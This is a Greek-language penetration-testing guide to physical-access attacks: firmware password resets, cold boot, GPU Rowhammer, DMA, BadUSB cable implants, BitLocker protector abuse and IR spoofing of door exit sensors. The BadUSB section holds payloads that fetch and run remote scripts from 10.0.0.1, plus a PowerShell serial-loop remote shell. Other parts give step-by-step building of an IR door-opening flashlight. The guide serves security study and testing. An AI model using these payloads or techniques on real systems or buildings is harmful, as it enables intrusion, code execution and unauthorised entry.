## Ανάκτηση κωδικού BIOS και ασφάλεια συστήματος

Οι ρυθμίσεις firmware παλαιότερων PC μπορεί να επαναφερθούν αποσυνδέοντας την μπαταρία CMOS ή χρησιμοποιώντας ένα τεκμηριωμένο jumper εκκαθάρισης CMOS. Ο απαιτούμενος χρόνος απενεργοποίησης εξαρτάται από τη μητρική, ενώ οι σύγχρονοι κωδικοί ή τα κλειδιά UEFI μπορεί να αποθηκεύονται σε μη πτητική μνήμη flash, σε ενσωματωμένο ελεγκτή ή σε συσκευή ασφαλείας και, επομένως, να διατηρούνται μετά την αφαίρεση της μπαταρίας. Συμβουλευτείτε το εγχειρίδιο της μητρικής ή το εγχειρίδιο σέρβις πριν βραχυκυκλώσετε ακίδες· αυτή η διαδικασία μπορεί επίσης να ακυρώσει τις μετρήσεις TPM και να ενεργοποιήσει την ανάκτηση κρυπτογράφησης δίσκου.

Σε παλαιότερα συστήματα x86, εργαλεία όπως τα **killCMOS** και **CmosPwd** μπορούν να επιθεωρήσουν ή να τροποποιήσουν ρυθμίσεις που υποστηρίζονται από CMOS μέσα από ένα εκκινήσιμο περιβάλλον. Το CmosPwd αναγνωρίζει μορφές κωδικών από ένα τεκμηριωμένο σύνολο παλαιότερων οικογενειών BIOS και μπορεί να δημιουργήσει αντίγραφο ασφαλείας, να επαναφέρει ή να διαγράψει/τερματίσει την κατάσταση CMOS· οι δημοσιευμένες εκδόσεις του προορίζονται για παλαιότερα περιβάλλοντα DOS/Windows, Linux, FreeBSD και NetBSD.<sup>[[18]](#references)</sup> Αυτά τα βοηθητικά προγράμματα δεν αφαιρούν γενικά κωδικούς UEFI και απαιτούν επαρκή πρόσβαση στο υλικό/firmware.

Κάποια firmware φορητών υπολογιστών εμφανίζουν έναν κωδικό πρόκλησης ειδικό για τον κατασκευαστή μετά από αρκετές αποτυχημένες προσπάθειες εισαγωγής κωδικού. Βάσεις δεδομένων όπως το [bios-pw.org](https://bios-pw.org) μπορούν να παράγουν κωδικούς ανάκτησης παλαιού τύπου από τον κατασκευαστή για ορισμένα μοντέλα, αλλά πολλά συστήματα εφαρμόζουν κλείδωμα χωρίς κωδικό πρόκλησης από τον οποίο μπορεί να παραχθεί κωδικός ανάκτησης. Θεωρήστε κάθε παραγόμενο κωδικό ειδικό για το μοντέλο και αποφύγετε να εξαντλήσετε μόνιμους μετρητές προσπαθειών.

### Ασφάλεια UEFI

Για σύγχρονα συστήματα **UEFI**, το CHIPSEC μπορεί να ελέγξει την προστασία των μεταβλητών Secure Boot. Ξεκινήστε με τον παρακάτω έλεγχο που δεν τροποποιεί το σύστημα· η προαιρετική λειτουργία `-a modify` επιχειρεί σκόπιμα να καταστρέψει μεταβλητές και πρέπει να χρησιμοποιείται μόνο σε εργαστηριακό σύστημα που μπορεί να ανακτηθεί. Το ίδιο το CHIPSEC προειδοποιεί ότι το προνομιακό πρόγραμμα οδήγησης και η πρόσβαση χαμηλού επιπέδου στο υλικό δεν είναι κατάλληλα για τερματικά παραγωγής.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

## Ανάλυση RAM και Cold Boot Attacks

Η DRAM δεν χάνει αμέσως κάθε bit όταν σταματά η ανανέωση. Ο ρυθμός αλλοίωσης των δεδομένων ποικίλλει σημαντικά ανάλογα με την τεχνολογία της μονάδας και τη θερμοκρασία· η ψύξη μπορεί να διατηρήσει χρήσιμα δεδομένα πολύ περισσότερο από έναν κύκλο απενεργοποίησης χωρίς ψύξη. Μια cold-boot attack επανεκκινεί γρήγορα το σύστημα σε ένα μικρό περιβάλλον απόκτησης δεδομένων ή μεταφέρει μια ψυχόμενη μονάδα, καταγράφει την ακατέργαστη μνήμη και ανακατασκευάζει κρυπτογραφικά κλειδιά παρά την αλλοίωση των bit. Ένα εργαλείο αντιγραφής δίσκου δεν είναι αυτομάτως εργαλείο απεικόνισης φυσικής μνήμης, ενώ το Volatility αναλύει μια καταγραφή αντί να την αποκτά· χρησιμοποιήστε κατάλληλο για την πλατφόρμα, επικυρωμένο εργαλείο απόκτησης δεδομένων.<sup>[[12]](#references)</sup>

## GPU Rowhammer κατά των Page Tables

Οι σύγχρονες GPU Rowhammer attacks γίνονται πολύ πιο χρήσιμες όταν στοχεύουν **μεταδεδομένα εικονικής μνήμης της GPU** αντί για συνηθισμένα buffers. Πρόσφατη έρευνα σε **GDDR6 NVIDIA Ampere GPUs** δείχνει ότι ένας attacker που εκτελεί μη προνομιούχο κώδικα CUDA μπορεί να δημιουργήσει μοτίβα hammering ειδικά για GPU, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει δομές σελιδοποίησης σε ευάλωτες γραμμές και έπειτα να αναστρέψει bit στο **last-level page table** ή σε έναν ενδιάμεσο **page directory**. Μόλις αλλοιωθεί μία εγγραφή μετάφρασης, ο attacker μπορεί να δημιουργήσει **αυθαίρετη ανάγνωση/εγγραφή μνήμης GPU** και έπειτα να στραφεί σε παραβίαση του host.<sup>[[1]](#references)[[2]](#references)</sup>

### Μοτίβο Εκμετάλλευσης

1. **Καταγραφή των γραμμών που επιδέχονται hammering** σε GDDR6 και δημιουργία μοτίβων hammering που λαμβάνουν υπόψη τις ανανεώσεις / είναι μη ομοιόμορφα, ώστε να παρακάμπτουν τα μέτρα μετριασμού εντός της DRAM.
2. **Διαμόρφωση των εκχωρήσεων μνήμης GPU** ώστε ο driver να τοποθετεί δομές μετάφρασης σελίδων σε φυσικές θέσεις που επιδέχονται hammering, αντί να τις διατηρεί στην προεπιλεγμένη προστατευμένη δεξαμενή. Στην πράξη, αυτό μπορεί να σημαίνει εξάντληση της περιοχής χαμηλής μνήμης που προορίζεται για page tables και δημιουργία πολλών μεγάλων, αραιών UVM mappings με ελεγχόμενα βήματα.
3. **Αναστροφή μεταδεδομένων μετάφρασης**, όπως τα bit **PFN** ή bit που σχετίζονται με το aperture, μέσα σε μια εγγραφή page-table / page-directory, ώστε η εικονική σελίδα που ελέγχει ο attacker να αντιστοιχιστεί σε σελίδες page-table, αυθαίρετη μνήμη GPU ή system mappings ορατά από το host.
4. Επαναχρησιμοποίηση του πλαστογραφημένου mapping για την τροποποίηση πρόσθετων εγγραφών μετάφρασης και κλιμάκωση σε **αυθαίρετη ανάγνωση/εγγραφή μνήμης GPU** σε όλα τα GPU contexts.

### Μετάβαση στο Host και Μέτρα Μετριασμού

- Με **απενεργοποιημένο IOMMU**, τα πλαστογραφημένα system-aperture mappings μπορούν να εκθέσουν αυθαίρετη **φυσική μνήμη host** στην GPU, μετατρέποντας το primitive της GPU σε πλήρη παραβίαση του host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Το **GDDRHammer** στοχεύει εγγραφές last-level page-table, ενώ το **GeForge** δείχνει ότι η αλλοίωση ενός επιπέδου page-directory μπορεί να είναι ευκολότερη, επειδή μία αναστροφή bit μπορεί να ανακατευθύνει ένα μεγαλύτερο υποδέντρο μετάφρασης. Μην θεωρείτε μόνο ένα επίπεδο σελιδοποίησης κρίσιμο για την ασφάλεια.<sup>[[1]](#references)[[2]](#references)</sup>
- Το **IOMMU** εξακολουθεί να έχει σημασία, επειδή αποκλείει την άμεση πρόσβαση σε αυθαίρετη μνήμη host που χρησιμοποιούν τα GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρες μέτρο μετριασμού**. Το **GPUBreach** δείχνει μια δεύτερη φάση μετάβασης, όπου ο attacker αλλοιώνει buffers CPU που είναι εγγράψιμα από την GPU και ανήκουν στον driver, και έπειτα ενεργοποιεί σφάλματα ασφάλειας μνήμης του NVIDIA driver, αποκτώντας primitive εγγραφής στον kernel και **root shell**, ακόμη και με ενεργοποιημένο IOMMU.<sup>[[3]](#references)</sup>
- Το **ECC σε επίπεδο συστήματος** είναι ένα πρακτικό μέτρο ενίσχυσης της ασφάλειας σε υποστηριζόμενες GPU workstation/server. Οι consumer GPU χωρίς ECC προσφέρουν ασθενέστερη επιφάνεια άμυνας.<sup>[[4]](#references)</sup>
- Αυτές οι επιθέσεις δεν είναι καθαρά θεωρητικές: το **GeForge** ανέφερε **1,171** αναστροφές bit σε μια RTX 3060 και **202** σε μια RTX A6000, αρκετές για τη δημιουργία μιας λειτουργικής αλυσίδας κλιμάκωσης προνομίων στο host.<sup>[[2]](#references)[[9]](#references)</sup>

## Επιθέσεις Άμεσης Πρόσβασης στη Μνήμη (DMA)

Για offline επιδιόρθωση UEFI IFR/NVRAM που μπορεί να υποβαθμίσει την επιβολή IOMMU πριν από την εκκίνηση και να ενεργοποιήσει μια αλυσίδα DMA σε Windows, δείτε:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

Το **Inception** επιδεικνύει **απόκτηση και επιδιόρθωση μνήμης μέσω DMA** από interfaces όπως το FireWire και πρώιμες διαμορφώσεις Thunderbolt, συμπεριλαμβανομένων ιστορικών υπογραφών παράκαμψης σύνδεσης. Δεν είναι απλώς «αναποτελεσματικό απέναντι στα Windows 10»: η δυνατότητα εκμετάλλευσης εξαρτάται από το interface, την έκδοση του συστήματος-στόχου, την πολιτική IOMMU, την κατάσταση κλειδώματος και το αν υποστηρίζεται και είναι ενεργοποιημένο το Windows Kernel DMA Protection. Τα Windows 10 έκδοση 1803 και νεότερες εισήγαγαν το Kernel DMA Protection σε συμβατές πλατφόρμες, αλλάζοντας σημαντικά την επιφάνεια επίθεσης.<sup>[[13]](#references)[[14]](#references)</sup>

## Live CD/USB για Πρόσβαση στο Σύστημα

Σε έναν μη κρυπτογραφημένο ή ήδη ξεκλειδωμένο τόμο Windows, ένα offline περιβάλλον μπορεί να αντικαταστήσει binaries προσβασιμότητας, όπως τα **sethc.exe** ή **Utilman.exe**, με το **cmd.exe**, παρέχοντας μια γραμμή εντολών SYSTEM όταν χρησιμοποιηθεί η αντίστοιχη συντόμευση στην οθόνη σύνδεσης. Εργαλεία όπως το **chntpw** μπορούν να επεξεργαστούν τα δεδομένα τοπικών λογαριασμών SAM. Αυτές οι μέθοδοι δεν παρακάμπτουν έναν κλειδωμένο τόμο BitLocker και μπορεί να καταστρέψουν διαπιστευτήρια που προστατεύονται με DPAPI/EFS· διατηρήστε εγκληματολογικά αντίγραφα και αντίγραφα ασφαλείας.

Το **Kon-Boot** είναι ένα εμπορικό εργαλείο παράκαμψης ελέγχου ταυτότητας κατά την εκκίνηση, για υποστηριζόμενες διαμορφώσεις Windows/macOS. Η συμβατότητα εξαρτάται από το λειτουργικό σύστημα, τη λειτουργία firmware, το Secure Boot και τη ρύθμιση κρυπτογράφησης δίσκου· δεν αποκρυπτογραφεί έναν κλειδωμένο τόμο BitLocker.<sup>[[10]](#references)</sup>

## Χειρισμός Δυνατοτήτων Ασφάλειας των Windows

### Συντομεύσεις Εκκίνησης και Ανάκτησης

- Τα **Delete/Supr**, F2, F10 ή κάποιο άλλο πλήκτρο του κατασκευαστή μπορεί να ανοίξουν τις ρυθμίσεις firmware.
- Το **F8** ανοίγει τις παλαιού τύπου επιλογές σύνθετης εκκίνησης των Windows μόνο σε διαμορφώσεις όπου αυτή η διαδρομή παραμένει ενεργοποιημένη· η είσοδος στην τρέχουσα λειτουργία ανάκτησης διαφέρει.
- Το πάτημα του **Shift** μπορεί να αποτρέψει την αυτόματη σύνδεση στα Windows σε ορισμένες διαμορφώσεις, αν και οι ρυθμίσεις πολιτικής/registry μπορούν να απενεργοποιήσουν αυτή τη συμπεριφορά.<sup>[[17]](#references)</sup>

### BAD USB Devices

Συσκευές όπως το **USB Rubber Ducky** και οι πλακέτες Teensy μπορούν να αναγνωριστούν ως αξιόπιστα πληκτρολόγια HID και να εισαγάγουν προκαθορισμένα πλήκτρα. Το payload αρχικά έχει τα προνόμια και την πρόσβαση στην επιφάνεια εργασίας της συνδεδεμένης συνεδρίας· τα μηνύματα UAC, το κλείδωμα οθόνης, η διάταξη πληκτρολογίου, ο χρονισμός και η πολιτική USB των endpoints εξακολουθούν να το περιορίζουν.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Προνόμια διαχειριστή ή δημιουργίας αντιγράφων ασφαλείας μπορούν να χρησιμοποιηθούν για τη δημιουργία shadow copy ή την αποθήκευση registry hives, ώστε να αποκτηθούν κλειδωμένα αρχεία όπως τα **SAM** και **SYSTEM**. Πρόκειται για τεχνική συλλογής δεδομένων μετά την παραβίαση, όχι για παράκαμψη προνομίων· τα σχετικά συμβάντα πρέπει να συσχετίζονται με συμβάντα εξαγωγής των `diskshadow`/VSS και των registry hives.

## Τεχνικές Εμφύτευσης BadUSB / HID

### Εμφυτεύματα καλωδίων με διαχείριση μέσω Wi-Fi

- Εμφυτεύματα βασισμένα σε ESP32-S3, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε καλώδια USB-A→USB-C ή USB-C↔USB-C, αναγνωρίζονται αποκλειστικά ως πληκτρολόγιο USB και εκθέτουν τη στοίβα C2 μέσω Wi-Fi. Ο χειριστής χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από τον υπολογιστή του θύματος, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και κωδικό πρόσβασης `123456789`, και να μεταβεί στη διεύθυνση [http://cable-wind.local/](http://cable-wind.local/) (ή στη διεύθυνση DHCP) για να αποκτήσει πρόσβαση στο ενσωματωμένο HTTP interface.<sup>[[8]](#references)</sup>
- Το περιβάλλον χρήσης του browser διαθέτει καρτέλες για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* και *Config*. Τα αποθηκευμένα payloads φέρουν ετικέτες ανά OS, οι διατάξεις πληκτρολογίου αλλάζουν επιτόπου και οι συμβολοσειρές VID/PID μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά περιφερειακά.
- Επειδή το C2 βρίσκεται μέσα στο καλώδιο, ένα τηλέφωνο μπορεί να προετοιμάζει payloads, να ενεργοποιεί την εκτέλεσή τους και να διαχειρίζεται διαπιστευτήρια Wi-Fi χωρίς να χρησιμοποιεί το δίκτυο του οργανισμού—χρήσιμο σε φυσικές εισβολές σύντομης διάρκειας.

### Payloads AutoExec με επίγνωση του OS

- Οι κανόνες AutoExec συνδέουν ένα ή περισσότερα payloads με άμεση εκτέλεση μετά την αναγνώριση της συσκευής USB. Το εμφύτευμα πραγματοποιεί ελαφριά ταυτοποίηση του OS και επιλέγει το αντίστοιχο script.
- Παράδειγμα ροής εργασίας:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η εκτέλεση γίνεται χωρίς επίβλεψη, η απλή αντικατάσταση ενός καλωδίου φόρτισης μπορεί να προσφέρει αρχική πρόσβαση τύπου «plug-and-pwn» στο πλαίσιο χρήστη που είναι συνδεδεμένος.

### Remote Shell μέσω Wi-Fi TCP με Εκκίνηση από HID

1. **Αρχικοποίηση μέσω πλήκτρων:** Ένα αποθηκευμένο payload ανοίγει μια κονσόλα και επικολλά έναν βρόχο που εκτελεί ό,τι λαμβάνει από τη νέα συσκευή USB serial. Μια ελάχιστη παραλλαγή για Windows είναι η εξής:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Το implant διατηρεί ανοιχτό το κανάλι USB CDC, ενώ το ESP32-S3 του ξεκινά έναν TCP client (Python script, Android APK ή desktop executable) με σύνδεση πίσω στον operator. Οποιαδήποτε bytes πληκτρολογούνται στη συνεδρία TCP προωθούνται στον παραπάνω serial loop, παρέχοντας απομακρυσμένη εκτέλεση εντολών ακόμη και σε hosts χωρίς σύνδεση στο δίκτυο. Η έξοδος είναι περιορισμένη, γι’ αυτό οι operators συνήθως εκτελούν εντολές στα τυφλά (δημιουργία λογαριασμών, προετοιμασία πρόσθετων εργαλείων κ.λπ.).

### Επιφάνεια HTTP OTA update

- Η τεκμηριωμένη διεπαφή του Evil Crow Cable Wind εκθέτει ένα endpoint ενημέρωσης firmware χωρίς authentication στο `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Οι χειριστές πεδίου μπορούν να κάνουν hot-swap λειτουργιών (π.χ. να περάσουν firmware USB Army Knife) κατά τη διάρκεια της επιχείρησης, χωρίς να ανοίξουν το καλώδιο, επιτρέποντας στο implant να αποκτήσει νέες δυνατότητες ενώ παραμένει συνδεδεμένο στον υπολογιστή-στόχο.

## Παράκαμψη της κρυπτογράφησης BitLocker

Μια εξουσιοδοτημένη εγκληματολογική απόκτηση δεδομένων από ένα σύστημα που λειτουργεί ή λειτουργούσε πρόσφατα ενδέχεται να περιέχει το volume master key του BitLocker ή σχετικό υλικό κλειδιού, όσο ο τόμος είναι ξεκλείδωτος. Εμπορικά εργαλεία όπως τα Elcomsoft Forensic Disk Decryptor και Passware Kit Forensic μπορούν να αναζητήσουν σε υποστηριζόμενα memory images, αρχεία αδρανοποίησης ή crash dumps, αλλά η επιτυχία δεν είναι εγγυημένη. Τα σύγχρονα Windows κρυπτογραφούν επίσης τα crash dumps όταν είναι ενεργοποιημένο το BitLocker, ενώ ένας αποθηκευμένος κωδικός ανάκτησης 48 ψηφίων είναι διαφορετικό τεκμήριο από ένα κλειδί τόμου που βρίσκεται στη μνήμη.<sup>[[12]](#references)[[16]](#references)</sup>

## Κοινωνική μηχανική για την προσθήκη κλειδιού ανάκτησης

Ένας εισβολέας που πείθει έναν διαχειριστή να εκτελέσει εντολές διαχείρισης του BitLocker μπορεί να προσθέσει έναν protector τύπου recovery-password, external-key ή άλλου τύπου και στη συνέχεια να τον υποκλέψει. Ο κωδικός ανάκτησης δεν μπορεί να είναι μια αυθαίρετη συμβολοσειρά από μηδενικά: οι αριθμητικοί κωδικοί ανάκτησης του BitLocker έχουν επικυρωμένη μορφή 48 ψηφίων. Η σχετική σύνταξη για εξουσιοδοτημένη διαχείριση είναι `manage-bde -protectors -add C: -recoverypassword`· εμφανίστε τους protectors που προκύπτουν με `manage-bde -protectors -get C:`. Παρακολουθείτε τις προσθήκες protectors και βεβαιωθείτε ότι το νέο υλικό ανάκτησης αποθηκεύεται με escrow μόνο σε εγκεκριμένες τοποθεσίες.<sup>[[16]](#references)</sup>

## Εκμετάλλευση διακοπτών παραβίασης πλαισίου / συντήρησης για επαναφορά του BIOS στις εργοστασιακές ρυθμίσεις

Πολλοί σύγχρονοι φορητοί υπολογιστές και επιτραπέζιοι υπολογιστές μικρού form factor διαθέτουν **διακόπτη παραβίασης πλαισίου**, τον οποίο παρακολουθούν ο Embedded Controller (EC) και το firmware του BIOS/UEFI. Παρότι ο βασικός σκοπός του διακόπτη είναι να ειδοποιεί όταν ανοίγεται μια συσκευή, ορισμένοι κατασκευαστές υλοποιούν μια **μη τεκμηριωμένη συντόμευση ανάκτησης**, η οποία ενεργοποιείται όταν ο διακόπτης αλλάξει κατάσταση με συγκεκριμένο μοτίβο.<sup>[[5]](#references)[[6]](#references)</sup>

### Πώς λειτουργεί η επίθεση

1. Ο διακόπτης συνδέεται σε ένα **GPIO interrupt** του EC.
2. Το firmware που εκτελείται στον EC καταγράφει τον **χρονισμό και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα προκαθορισμένο μοτίβο, ο EC εκτελεί μια ρουτίνα *mainboard-reset* που **διαγράφει τα περιεχόμενα του system NVRAM/CMOS**.
4. Κατά την επόμενη εκκίνηση, τα επηρεαζόμενα μοντέλα φορτώνουν την κατάσταση firmware μετά την επαναφορά. Ανάλογα με τον κατασκευαστή και την έκδοση, η διαγραμμένη κατάσταση μπορεί να περιλαμβάνει κωδικό supervisor, προσαρμοσμένες ρυθμίσεις εκκίνησης ή καταχωρισμένα κλειδιά Secure Boot· η κατάσταση του TPM και οι επιπτώσεις στην κρυπτογράφηση δίσκου πρέπει να αξιολογούνται ξεχωριστά.

> Η επαναφορά του firmware μπορεί να επαναφέρει τις επιλογές εξωτερικής εκκίνησης, αλλά **δεν** αποκρυπτογραφεί τον αποθηκευτικό χώρο. Το BitLocker ή κάποιο άλλο σύστημα πλήρους κρυπτογράφησης δίσκου μπορεί να ζητήσει ανάκτηση μετά από αλλαγές στο TPM/firmware και να συνεχίσει να προστατεύει τον εσωτερικό δίσκο χωρίς κλειδί ανάκτησης.<sup>[[16]](#references)</sup>

### Παράδειγμα από τον πραγματικό κόσμο – φορητός υπολογιστής Framework 13

Η συντόμευση ανάκτησης για το Framework 13 (11ης/12ης/13ης γενιάς) είναι η εξής:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Μετά τον δέκατο κύκλο, το EC θέτει μια σημαία που δίνει εντολή στο BIOS να διαγράψει το NVRAM κατά την επόμενη επανεκκίνηση. Η διαδικασία διαρκεί περίπου 40 s και απαιτεί **μόνο ένα κατσαβίδι**.<sup>[[5]](#references)</sup>

### Γενική διαδικασία εκμετάλλευσης

1. Ενεργοποιήστε ή θέστε σε αναστολή και επαναφέρετε τον στόχο, ώστε να εκτελείται το EC.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκαλύψετε τον διακόπτη παραβίασης/συντήρησης.
3. Επαναλάβετε το μοτίβο εναλλαγής που είναι ειδικό για τον κατασκευαστή (συμβουλευτείτε την τεκμηρίωση ή φόρουμ, ή κάντε reverse-engineer το firmware του EC).
4. Συναρμολογήστε ξανά και επανεκκινήστε, έπειτα ελέγξτε ποιες ρυθμίσεις firmware και διαπιστευτήρια άλλαξαν πράγματι.
5. Αν έχετε εξουσιοδότηση και είναι διαθέσιμη η εξωτερική εκκίνηση, εκκινήστε από ένα ελεγχόμενο live image. Μόλις ξεκλειδωθεί νόμιμα ένας εσωτερικός τόμος (ή αν δεν ήταν ποτέ κρυπτογραφημένος), το live περιβάλλον μπορεί να αποκτήσει διαπιστευτήρια και δεδομένα ή να ελέγξει το EFI System Partition. Η τροποποίηση αυτού του partition για την εγκατάσταση ενός EFI implant είναι μόνιμη και ιδιαίτερα παρεμβατική, ενώ εξακολουθεί να περιορίζεται από το Secure Boot, το measured boot, την προστασία εγγραφής του firmware και την παρακολούθηση endpoint. Ο κρυπτογραφημένος αποθηκευτικός χώρος παραμένει απρόσιτος χωρίς το κλειδί ή το υλικό ανάκτησής του.

### Ανίχνευση και μετριασμός

* Καταγράφετε τα συμβάντα παραβίασης του σασί στην κονσόλα διαχείρισης του OS και συσχετίστε τα με απροσδόκητες επαναφορές του BIOS.
* Χρησιμοποιείτε **σφραγίδες ασφαλείας που αποκαλύπτουν παραβίαση** στις βίδες/τα καλύμματα για να εντοπίζετε το άνοιγμα.
* Φυλάσσετε τις συσκευές σε **χώρους με ελεγχόμενη φυσική πρόσβαση**· θεωρείτε ότι η φυσική πρόσβαση ισοδυναμεί με πλήρη παραβίαση.
* Όπου είναι διαθέσιμο, απενεργοποιείτε τη λειτουργία «maintenance switch reset» του κατασκευαστή ή απαιτείτε πρόσθετη κρυπτογραφική εξουσιοδότηση για επαναφορές NVRAM.

## Κρυφή έγχυση IR εναντίον αισθητήρων εξόδου χωρίς επαφή

### Χαρακτηριστικά αισθητήρα
- Οι συνήθεις αισθητήρες «wave-to-exit» συνδυάζουν έναν πομπό LED κοντινού IR με μια μονάδα δέκτη τύπου τηλεχειριστηρίου τηλεόρασης, η οποία δίνει λογικό high μόνο αφού ανιχνεύσει πολλαπλούς παλμούς (~4–10) στη σωστή συχνότητα φέροντος (≈30 kHz).<sup>[[7]](#references)</sup>
- Ένα πλαστικό κάλυμμα εμποδίζει τον πομπό και τον δέκτη να έχουν άμεση οπτική επαφή, οπότε ο ελεγκτής υποθέτει ότι κάθε επικυρωμένο φέρον σήμα προήλθε από κοντινή ανάκλαση και ενεργοποιεί ένα ρελέ που ανοίγει την ηλεκτρική κλειδαριά της πόρτας.
- Μόλις ο ελεγκτής θεωρήσει ότι υπάρχει στόχος, συχνά αλλάζει το περίβλημα διαμόρφωσης της εξερχόμενης εκπομπής, αλλά ο δέκτης εξακολουθεί να δέχεται κάθε ριπή που ταιριάζει στο φιλτραρισμένο φέρον σήμα.

### Ροή επίθεσης
1. **Καταγράψτε το προφίλ εκπομπής** – συνδέστε έναν logic analyser στις ακίδες του ελεγκτή για να καταγράψετε τις κυματομορφές πριν και μετά την ανίχνευση, οι οποίες οδηγούν το εσωτερικό LED IR.
2. **Επαναλάβετε μόνο την κυματομορφή «μετά την ανίχνευση»** – αφαιρέστε/αγνοήστε τον εργοστασιακό πομπό και οδηγήστε ένα εξωτερικό LED IR με το μοτίβο που ενεργοποιείται μετά την ανίχνευση, από την αρχή. Επειδή ο δέκτης ενδιαφέρεται μόνο για τον αριθμό παλμών και τη συχνότητα, αντιμετωπίζει το πλαστογραφημένο φέρον σήμα ως πραγματική ανάκλαση και ενεργοποιεί τη γραμμή του ρελέ.
3. **Ελέγξτε τη μετάδοση** – εκπέμπετε το φέρον σήμα σε ρυθμισμένες ριπές (π.χ. δεκάδες millisecond ενεργό, περίπου το ίδιο διάστημα ανενεργό), ώστε να παραδίδεται ο ελάχιστος αριθμός παλμών χωρίς να κορεστεί το AGC του δέκτη ή η λογική αντιμετώπισης παρεμβολών. Η συνεχής εκπομπή αποευαισθητοποιεί γρήγορα τον αισθητήρα και εμποδίζει την ενεργοποίηση του ρελέ.

### Ανακλαστική έγχυση μεγάλης εμβέλειας
- Η αντικατάσταση του LED του πάγκου δοκιμών με δίοδο IR υψηλής ισχύος, driver MOSFET και οπτικά εστίασης επιτρέπει αξιόπιστη ενεργοποίηση από απόσταση ~6 m.
- Ο εισβολέας δεν χρειάζεται οπτική επαφή με το άνοιγμα του δέκτη· αν στρέψει τη δέσμη σε εσωτερικούς τοίχους, ράφια ή κάσες θυρών που είναι ορατά μέσα από γυαλί, η ανακλώμενη ενέργεια μπορεί να εισέλθει στο οπτικό πεδίο ~30° και να μιμηθεί ένα κύμα χεριού από κοντινή απόσταση.
- Επειδή οι δέκτες αναμένουν μόνο ασθενείς ανακλάσεις, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να ανακλαστεί σε πολλαπλές επιφάνειες και να παραμείνει πάνω από το όριο ανίχνευσης.

### Οπλισμένος φακός επίθεσης
- Η ενσωμάτωση του driver σε έναν εμπορικό φακό κρύβει το εργαλείο σε κοινή θέα. Αντικαταστήστε το ορατό LED με ένα LED IR υψηλής ισχύος, κατάλληλο για τη ζώνη συχνοτήτων του δέκτη, προσθέστε ένα ATtiny412 (ή παρόμοιο) για την παραγωγή ριπών ≈30 kHz και χρησιμοποιήστε ένα MOSFET για να απορροφά το ρεύμα του LED.
- Ένας τηλεσκοπικός φακός zoom συγκεντρώνει τη δέσμη για μεγαλύτερη εμβέλεια/ακρίβεια, ενώ ένας κινητήρας δόνησης υπό τον έλεγχο του MCU παρέχει απτική επιβεβαίωση ότι η διαμόρφωση είναι ενεργή, χωρίς εκπομπή ορατού φωτός.
- Η εναλλαγή ανάμεσα σε αρκετά αποθηκευμένα μοτίβα διαμόρφωσης (με ελαφρώς διαφορετικές συχνότητες φέροντος και περιβλήματα) αυξάνει τη συμβατότητα με οικογένειες αισθητήρων που πωλούνται με διαφορετικές επωνυμίες, επιτρέποντας στον χειριστή να σαρώσει ανακλαστικές επιφάνειες μέχρι να ακουστεί το ρελέ και να ανοίξει η πόρτα.
